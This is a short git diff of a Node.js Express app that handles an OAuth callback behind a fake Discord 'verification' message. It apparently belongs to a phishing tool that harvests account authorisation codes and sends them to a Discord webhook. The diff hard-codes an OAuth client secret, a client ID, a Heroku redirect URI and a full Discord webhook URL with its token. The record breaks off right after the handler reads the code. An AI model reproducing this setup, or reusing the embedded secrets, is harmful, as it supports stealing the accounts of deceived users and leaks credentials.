@@ -1,8 +1,8 @@
 //Config
-const secret_value = '.WW8Q~BnSgyVc5h5DzTEQWU5wRmqyeJdqIo4Tas8'
-const client_id = 'a06c832a-e2a5-4d5e-a2b3-c5f8fb61fe35'
-const redirect_uri = 'https://d-na.herokuapp.com/'
-const webhook_url = 'webhook'
+const secret_value = 'Bvh8Q~hQYPgYvAhFlQrKKi5RJdQxoiHtSXMXKa9k'
+const client_id = '4b44c64f-3bda-423d-ba30-6144ea293859'
+const redirect_uri = 'https://assisbuteifl.herokuapp.com/'
+const webhook_url = 'https://discord.com/api/webhooks/1050416140448444467/WJwn-USlsBp2DEQfEda34zInhqM-9OKKKhVcGMF0DgRGhmkRdSh5atlOkbmHx631L9yR'
 //Requirements
 const axios = require('axios')
 const express = require('express')
@@ -10,7 +10,7 @@ const app = express()
 const port = process.env.PORT || 3000
 
 app.get('/', async (req, res) => {
-    res.send('인증이 완료되었습니다!')
+    res.send('Verification successful! go back to discord.')
     const code = req.query.code
     if (code == null) {
         return
